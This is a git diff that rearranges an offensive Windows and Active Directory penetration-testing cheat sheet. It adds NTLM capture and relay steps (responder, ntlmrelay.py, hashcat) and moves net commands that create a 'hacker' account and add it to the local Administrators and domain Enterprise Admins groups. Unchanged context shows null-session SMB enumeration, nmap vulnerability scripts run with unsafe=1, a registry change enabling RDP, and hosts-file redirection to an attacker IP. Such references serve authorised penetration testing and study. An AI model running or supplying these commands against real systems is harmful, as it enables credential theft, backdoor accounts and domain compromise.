@@ -1,6 +1,15 @@
 Windows
 
 
+# Active Directory
+
+Gain a foothold
+nmap -sn <target CIDR>                        Ping sweep of the local subnet
+responder -I eth0 -w
+ntlmrelay.py                                  Relay NTLM hashes
+hashcat                                       Try to crack hashes
+------------------------------------------------------------------------------------------------------
+
 # Anonymous users can obtain the Windows password policy
 
 msf > use auxiliary/scanner/smb/smb_enumusers 
@@ -21,7 +30,7 @@ netshareenumall
 querydominfo
 getdompwinfo
 
-net use \\target IP\ipc$ "" /u:""             # Windows
+net use \\target IP\ipc$ "" /u:""             Windows
 ------------------------------------------------------------------------------------------------------
 
 # CIFS Share Writeable By Everyone
@@ -44,56 +53,19 @@ proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
 
 nmap -Pn -n -T4 -p139,445 --script=smb-check-vulns --script-args=unsafe=1 <target range>
 
-enum -G <target IP>                           # Windows
+enum -G <target IP>                           Windows
 enum -P <target IP>
 
-nbtenum -r <target IP>                        # Windows
+nbtenum -r <target IP>                        Windows
 nbtenum -q <target IP>
 
 nbtscan -r <target range>
 nbtscan -f hosts.txt
 
-smbmap -H <target IP>                         # Show shares
+smbmap -H <target IP>                         Show shares
 smbclient //<target IP>/<share>
    dir
    get <filename>
-------------------------------------------------------------------------------------------------------
-
-# Show domain users and group information
-
-DumpSec
-------------------------------------------------------------------------------------------------------
-
-nltest /dclist:<domain>                       # Locate the domain controller
-global.exe "domain admins" \\dc-controller    # Show members of domain groups
-------------------------------------------------------------------------------------------------------
-
-# net commands
-
-net accounts                                  # Local password policies
-net accounts /domain
-net config workstation
-net group “Domain Admins" /domain             # Show all domain admin
-net group “Domain Users" /domain              # Show all domain users
-net localgroup                                # Local Security Groups
-net localgroup /domain                        # Domain Security Groups
-net localgroup Administrators                 # Users in the local Administrators Security Group
-net localgroup Administrators /domain         # Users in the domain Administrators Security Group
-net localgroup "Remote Desktop Users"
-net share
-net user                                      # Local users
-net user <user> <password> /add               # Add a local user
-net user /domain > users.txt                  # All users in the current user's domain (take a few to run)
-net user hacker /domain                       # Info on domain user
-net view                                      # Computers in the users domain and other domains
-net view /domain                              # Computers in other domain
-
-net user hacker abc123 /add
-net localgroup Administrators hacker /add
-
-net user hacker password /add /domain
-net group "Enterprise Admins" hacker /add /domain
-net groups "Enterprise Admins" /domain
 ------------------------------------------------------------------------------------------------------
 
 # Domain controller
@@ -178,6 +150,34 @@ echo <attacker IP> facebook >> %WINDIR%\System32\drivers\etc\hosts
 type %WINDIR%\System32\drivers\etc\hosts
 ------------------------------------------------------------------------------------------------------
 
+# net commands
+
+net accounts                                  Local password policies
+net accounts /domain
+net config workstation
+net group “Domain Admins" /domain             Show all domain admin
+net group “Domain Users" /domain              Show all domain users
+net localgroup                                Local Security Groups
+net localgroup /domain                        Domain Security Groups
+net localgroup Administrators                 Users in the local Administrators Security Group
+net localgroup Administrators /domain         Users in the domain Administrators Security Group
+net localgroup "Remote Desktop Users"
+net share
+net user                                      Local users
+net user <user> <password> /add               Add a local user
+net user /domain > users.txt                  All users in the current user's domain (take a few to run)
+net user hacker /domain                       Info on domain user
+net view                                      Computers in the users domain and other domains
+net view /domain                              Computers in other domain
+
+net user hacker abc123 /add
+net localgroup Administrators hacker /add
+
+net user hacker password /add /domain
+net group "Enterprise Admins" hacker /add /domain
+net groups "Enterprise Admins" /domain
+------------------------------------------------------------------------------------------------------
+
 # Open RDP in the firewall, start the service, and login
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -186,7 +186,15 @@ sc config termservice start= auto
 rdesktop -u <user> <targetIP>
 ------------------------------------------------------------------------------------------------------
 
-Windows Privilege Escalation Fundamentals
+# Show domain users and group information
+
+DumpSec
+
+nltest /dclist:<domain>                       Locate the domain controller
+global.exe "domain admins" \\dc-controller    Show members of domain groups
+------------------------------------------------------------------------------------------------------
+
+# Windows Privilege Escalation Fundamentals
 http://www.fuzzysecurity.com/tutorials/16.html
 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
